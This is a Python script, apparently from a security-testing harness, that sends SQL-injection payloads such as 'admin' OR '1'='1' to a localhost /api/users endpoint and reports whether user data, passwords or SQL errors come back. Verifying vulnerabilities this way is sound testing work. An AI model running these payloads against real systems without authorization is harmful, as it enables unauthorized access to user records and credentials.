#!/usr/bin/env python3
"""
Example exploit: SQL Injection via username parameter
Tests if the username parameter is vulnerable to injection attacks
"""

import requests
import json
import sys
import urllib.parse


def exploit():
    """Test SQL injection on /api/users endpoint."""
    target = "http://localhost:3000"
    results = {
        "vulnerability_id": "SQLI-001",
        "type": "SQL Injection",
        "status": "unknown",
        "evidence": [],
        "payloads_tested": []
    }

    # SQL injection payloads
    payloads = [
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        "' OR '1'='1",
        "1' OR '1' = '1",
    ]

    try:
        # First, get a baseline response
        baseline = requests.get(f"{target}/api/users?username=admin", timeout=10)
        baseline_length = len(baseline.text)

        for payload in payloads:
            print(f"[*] Testing payload: {payload}", file=sys.stderr)
            encoded_payload = urllib.parse.quote(payload)
            response = requests.get(
                f"{target}/api/users?username={encoded_payload}",
                timeout=10
            )

            results["payloads_tested"].append({
                "payload": payload,
                "status_code": response.status_code,
                "response_length": len(response.text)
            })

            # Check if we got a different response
            if response.status_code == 200:
                try:
                    data = response.json()

                    # Check if we got user data that shouldn't be accessible
                    if "user" in data or "users" in data:
                        results["status"] = "vulnerable"
                        results["evidence"].append(
                            f"Payload '{payload}' returned user data"
                        )

                        # Check if passwords are exposed
                        user_data = data.get("user") or data.get("users", [{}])[0]
                        if "password" in str(user_data):
                            results["evidence"].append("Passwords exposed in response")
                            results["data_exposed"] = ["passwords", "user_data"]

                except:
                    pass

            # Check for SQL error messages
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                results["status"] = "vulnerable"
                results["evidence"].append(f"SQL error message in response to: {payload}")

        if results["status"] == "unknown":
            results["status"] = "not_vulnerable"

    except requests.exceptions.RequestException as e:
        results["status"] = "error"
        results["error"] = str(e)
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)

    return results


if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))
